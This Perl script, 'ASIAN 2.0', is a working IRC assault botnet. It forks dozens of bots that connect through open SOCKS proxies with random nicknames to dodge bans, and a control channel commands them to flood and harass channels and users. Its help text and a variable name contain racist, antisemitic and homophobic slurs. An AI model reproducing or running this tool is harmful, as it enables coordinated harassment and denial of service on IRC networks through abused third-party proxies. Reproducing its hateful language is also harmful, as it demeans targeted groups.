#!/usr/bin/perl

# -->
# WORK IN PROGRESS
# <--

# ASIAN 2.0 by Jmax
# 
# I have made many modifications:
#  - Use of command line arguments as opposed to editing the script itself.
#  - Adding a SOCKS routine, instead of using Net::SOCKS (no non-standard modules will be required)
#  - Adding a random nick/fullname/ircname routine, instead of using Crypt::RandPasswd (no non-standard modules will be required)
#  - Improved fork routine/library
#
# The original header is as follows (NOTE: syntax here is _incorrect_):
# -----------------------------------------------
# ASIAN by Rucas
# Automated Synchronous IRC Assault Network
# Based on AYSYN by mef
#
# Make sure to put a SOCKS5 proxy list in proxies.txt in the same
# directory as this script.  If you'd like to use tor, you can put
# the correct info on one line in proxies.txt and this app will
# still function properly (although generally tor sucks)
#
# All bots join $channel and are issued raw irc commands from there
# using syntax "all PRIVMSG Rucas lol you fail it" for all bots or
# "botname PRIVMSG Rucas lol failure" and such.
#
# Testing of an early version of this script is the reason that
# Freenode now checks for open SOCKS proxies.
# -----------------------------------------------

# TODO:
#   file flooding with adjustments for nick-length

use warnings;
use strict;
use IO::Socket;
use IO::Handle;
# for forking
use POSIX qw(:signal_h :sys_wait_h);
my ($forkcount, $pid, $dead_nigger_storage, $maxfork) = (0, undef, 0, 50);
$SIG{INT} = sub { kill('INT', (getpgrp(0) * -1)) && exit; };
$SIG{CHLD} = sub { $dead_nigger_storage++ while(($pid = waitpid(-1, WNOHANG)) > 0); };
# end
use vars qw($VERSION);
$VERSION = "2.0-beta3";

error("please run using the --help argument") unless $ARGV[0];
my ($server, $port, $channel, $nickbase);
if ($ARGV[0] eq '--help') {
    print "ASIAN $VERSION by Jmax, Rucas, abez.  Inspired by code by mef.\n".
          "\n".
          "\n".
          "  Invocation:\n".
          "      perl ".__FILE__." server[:port] \"#channel\" [nickbase]\n".
          "\n".
          "    Where \"server\" is a hostname to an ircd, and \"#channel\" is the control channel\n".
          "    you want the bots to join, and \"server\" is optionally affixed with a port to\n".
          "    use (if not 6667) with a colon inbetween.  Please note that some shells will interpret\n".
          "    the # in \"#channel\" as a comment, and will not send it to the script.  In this case,\n".
          "    You may either use quotes, or escape the '#'.  I prefer quotes.  You may also, optionally,\n".
          "    specify a nickbase.  This will cause all nicks to begin with that string. You should\n".
          "    probably not do this, as it makes your bots easier to ban.\n".
          "\n".
          "\n".
          "  Usage:\n".
          "      all <raw IRC command> [space-delimited arguments] :[arguments with spaces]\n".
          "      <botname> <raw IRC command> [space-delimited arguments] :[arguments with spaces]\n".
          "      <botname>,<botname2>,... <raw IRC command> [space-delimited arguments] :[arguments with spaces]\n".
          "\n".
          "    Simply privmsg your command to the control channel, and the respective bots will follow.\n".
          "\n".
          "  Examples:\n".
          "      <~supers> all join #gnaa gnaa\n".
          "        All bots will join #gnaa using the key 'gnaa'\n".
          "      <~supers> all privmsg #gnaa :LOL HY LOL HY\n".
          "        All bots will say \"LOL HY LOL HY\" in #gnaa\n".
          "      <\@Rucas> fgtbot2235 nick NOT_FGT_LOL_GIMME_VOICE\n".
          "        The bot with the nick 'fgtbot2235' will change its nick to 'NOT_FGT_LOL_GIMME_VOICE'\n".
          "      <\@Jmax> NOT_FGT_LOL_GIMME_VOICE,dongs,loljews,nullo_is_a_fag_LOL part #gnaa :lol jews\n".
          "        The bots with the nicks 'NOT_FGT_LOL_GIMME_VOICE', 'dongs', 'loljews', and 'nullo_is_a_fag_LOL'\n".
          "        will part #gnaa with reason 'lol jews'\n".
          "\n".
          "\n".
          "    Enjoy. -- Jmax\n";
    exit 0;
} elsif ($ARGV[0] eq '--version') {
    print "ASIAN $VERSION by Jmax, Rucas, abez.  Based on code by mef.\n";
    exit 0;
} else {
    error("please run using the --help argument") unless $ARGV[1];
    if ($ARGV[0] =~ /(.+):(\d+)/) {
        $server = $1;
        $port = $2;
    } else {
        $server = $ARGV[0];
        $port = 6667;
    }
    $channel = $ARGV[1];
    if ($ARGV[2]) {
        $nickbase = $ARGV[2];
    }
}

my @servers = resolve($server);
notice("Resolved $server as ".join(", ", @servers));

my %proxies = load_socks();
my @proxylist = get_proxylist(%proxies);

notice("Initiliazing (forking) bots");
for ($forkcount = 0; $forkcount < $maxfork; $forkcount++) { # $forkcount must _not_ be local to here
    sleep 1;                          # so we don't overload ourselves
    if (!defined(my $pid = fork())) { # fork
        error("couldn't fork: $!");   # die if fork fails
    } elsif ($pid == 0) {             # fork successful, in child, do stuff
        while (%proxies) {
            my $proxy_ip = $proxylist[int rand @proxylist];
            my $proxy_port = $proxies{$proxy_ip};
            spawn_bot($proxy_ip, $proxy_port, $servers[int rand @servers], $port) 
                or (delete $proxies{$proxy_ip} and @proxylist = get_proxylist(%proxies));
            sleep 10; # to prevent throttling by IRCd
        }
        exit 0; # kills child
    } else {  # this is the parent
    } 
}
sleep while ($dead_nigger_storage < $maxfork);
exit 666;

sub load_socks {
    my (%proxies, @proxylist, $socksn);
    open SOCKSFILE, "<", "./socks.txt" or error("could not open socks proxies file socks.txt: $!");
    while (<SOCKSFILE>) { 
        chomp;
        my ($ip, $port) = /([^:]+):([^:]+)/;
        $proxies{$ip} = $port;
        $socksn++;
    }
    close(SOCKSFILE) or error("could not close socks proxies file socks.txt: $!");
    notice("acquired $socksn socks prox(y|ies).");
    return (%proxies);
}

sub spawn_bot { # only return 0 if the proxy failed.  Otherwise, return 1;
    my ($socks_ip, $socks_port, $remote_ip, $remote_port) = @_;
    my ($nick, $nicklen);
    if ($nickbase) {
        $nicklen = int(rand(4)) + 3;    
        $nick = $nickbase . random_num($nicklen);
    } else {
        $nicklen = int(rand(9)) + 3;    
        $nick = random_nick($nicklen);
    }
    my $identlen = int(rand(4)) + 3;
    my $ident = lc(random_nick($identlen));
    my $realnamelen = int(rand(9)) + 7;
    my $realname = random_nick($realnamelen);
    my ($line, $sock, $altsock);
    eval {
      local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
      alarm 5;
      $sock = connect_to_socks_proxy($socks_ip, $socks_port, $remote_ip, $remote_port);
      alarm 0;
    };
    if ($@) {
      error("unkown error: $@") unless $@ eq "alarm\n"; # propagate unexpected errors
      warning("TIMEOUT / CONNECTION REFUSED; SOCKS == SHIT; DELETING AND LOADING NEW;"); 
      return 0;
    }
    $sock = connect_to_socks_proxy($socks_ip, $socks_port, $remote_ip, $remote_port);
    return 0 unless $sock;
    print $sock "NICK $nick\r\n";
    outgoing($nick, "NICK $nick");
    print $sock "USER $ident * * :$realname\r\n";
    outgoing($nick, "USER $ident * * :$realname");
    while ($line = <$sock>) {
        chomp $line;
        next if $line =~ /372/; # ignore motd msgs
        incoming($nick, $line);
        last if $line =~ /376|422/; # end of motd or no motd
        return 0 if $line =~ /BANNED/i;
        return 0 if $line =~ /ERROR.*G.lined/i;
        return 0 if $line =~ /ERROR.*K.lined/i;
        return 1 if $line =~ /ERROR/i;
        return 1 if $line =~ /432/;
        return 1 if $line =~ /433/;
        if ($line =~ /PING (.*)$/) {
            print $sock "PONG $1\r\n";
        }
    }
    print $sock "JOIN $channel\r\n";
    outgoing($nick, "JOIN $channel");
    while ($line = <$sock>) {
        chomp $line;
        if ($line =~ /PING (.*)$/) {
            print $sock "PONG $1\r\n";
        } elsif ($line =~ /PRIVMSG $channel :all (.*)$/i) {
            my $cmd = $1;
            if ($cmd =~ /nick (\S*)/i) {
                $nick = $1;
            }
            incoming($nick, $line);
            print $sock "$cmd\r\n";
            outgoing($nick, $cmd);
        } elsif ($line =~ /PRIVMSG $channel :(?:\S*|\s*)$nick(?:\S*|\s*) (.*)$/i) {
            my $cmd = $1;
            if ($cmd =~ /nick (\S*)/i) {
                $nick = $1;
            } 
            incoming($nick, $line);
            print $sock "$cmd\r\n";
            outgoing($nick, $cmd);
        } else {
            incoming($nick, $line);
        }
    }
}

sub connect_to_socks_proxy {
    # see http://socks.permeo.com/protocol/socks4.protocol
    my ($socks_ip, $socks_port, $remote_ip, $remote_port) = @_;
    my $sock = IO::Socket::INET->new(
        PeerAddr => $socks_ip,
        PeerPort => $socks_port,
        Proto  => 'tcp'
    );
    return unless $sock;
    $sock->autoflush(1);    
    print $sock pack('CCn', 4, 1, $remote_port) . inet_aton($remote_ip) . pack('x');
    my $received = '';
    while (read($sock, $received, 8) && (length($received) < 8)) {}
    my ($vn, $cd, $listen_port, $listen_addr) = unpack('CCnN', $received);
    return unless $cd;
    if ($cd != 90) {
        return;
    }
    return $sock;
}

sub random_nick {
    my $length = shift;
    my $possible = '0123456789abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ'; # NO PIPES. (lol, weird bug)
    my @possible = split(//, $possible);
    my $str = '';
    while (length($str) < $length) {
        $str .= $possible[int rand @possible];
    }
    return $str;
}

sub random_num {
    my $length = shift;
    my $possible = '0123456789'; # NO PIPES. (lol, weird bug)
    my @possible = split(//, $possible);
    my $str = '';
    while (length($str) < $length) {
        $str .= $possible[int rand @possible];
    }
    return $str;
}

sub resolve {
    my $host = shift;
    my (undef, undef, undef, undef, @servers) = gethostbyname($host);
    unless (@servers) {
        error("cannot resolve server $host: $?");
        return 0;
    }
    my @servers_ip;
    foreach my $server (@servers) {
        my ($a, $b, $c, $d) = unpack('C4', $server);
        my $server_ip = "$a.$b.$c.$d";
        push (@servers_ip, $server_ip);
   }
   return @servers_ip;
}

sub get_proxylist { 
    my $proxies = @_;
    my @proxylist;
    foreach my $key (keys %proxies) {
        push(@proxylist, $key);
    }
    return @proxylist;
}

sub notice {
    my $notice = shift;
    print ">>>> ". $notice ."\n";
    return;
}

sub incoming {
    my ($nick, $line, $server) = @_;
    printf("IRCd >>>> %-12s  ] %s\n", $nick, $line);
    return;
}

sub outgoing {
    my ($nick, $line, $server) = @_;
    printf("IRCd <<<< %-12s  ] %s\n", $nick, $line);    
    return;
}

sub warning {
    my $warning = shift;
    print "!!!! ". $warning ."\n";
    return;
}

sub error {
    my $error = shift;
    print "!!!! ". $error ."\n";
    exit 0;
}
